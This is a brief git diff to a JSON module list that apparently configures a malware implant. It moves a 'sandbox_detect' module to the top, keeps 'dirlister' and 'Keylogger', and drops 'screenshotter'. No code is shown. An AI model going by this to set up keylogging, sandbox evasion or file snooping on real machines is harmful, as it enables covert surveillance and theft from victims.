@@ -1,5 +1,8 @@
 [
   {
+    "module": "sandbox_detect"
+  },
+  {
     "module": "dirlister"
   },
   {
@@ -7,11 +10,5 @@
   },
   {
     "module": "Keylogger"
-  },
-  {
-    "module": "screenshotter"
-  },
-  {
-    "module": "sandbox_detect"
   }
 ]
